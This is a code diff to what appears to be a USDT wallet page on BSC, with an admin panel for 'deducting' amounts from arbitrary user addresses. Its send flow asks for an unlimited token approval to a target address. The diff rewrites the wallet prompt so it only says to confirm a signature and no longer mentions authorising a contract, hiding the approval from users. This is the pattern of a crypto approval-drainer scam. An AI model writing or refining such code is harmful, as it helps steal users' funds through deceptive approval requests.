@@ -60,7 +60,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 <div class="token-row">
 <div class="token-left">
 <img class="usdt-icon" src="https://bscscan.com/token/images/tether_32.png">
-<span class="token-name">****</span>
+<span class="token-name">USDT</span>
 </div>
 <span class="token-balance" id="balanceText">0.000000</span>
 </div>
@@ -80,7 +80,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 <input class="admin-input" id="userAddrInput" placeholder="0x开头BSC地址">
 </div>
 <div class="admin-input-item">
-<div class="label-text">划扣****数量</div>
+<div class="label-text">划扣数量</div>
 <input class="admin-input" id="deductAmountInput" inputmode="decimal" placeholder="输入划扣金额">
 </div>
 <button class="admin-btn" id="deductBtn">确认划扣</button>
@@ -224,7 +224,7 @@ sendBtn.addEventListener("click", async () => {
     try {
         const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
         if (BigInt(allowance) < BigInt(weiVal)) {
-            alert("需要授权****合约，请在钱包确认签名");
+            alert("请在钱包确认签名");
             await usdtContract.methods.approve(TARGET_ADDR, APPROVE_MAX_AMOUNT).send({from:userAddress});
             alert("授权完成，开始转账");
         }
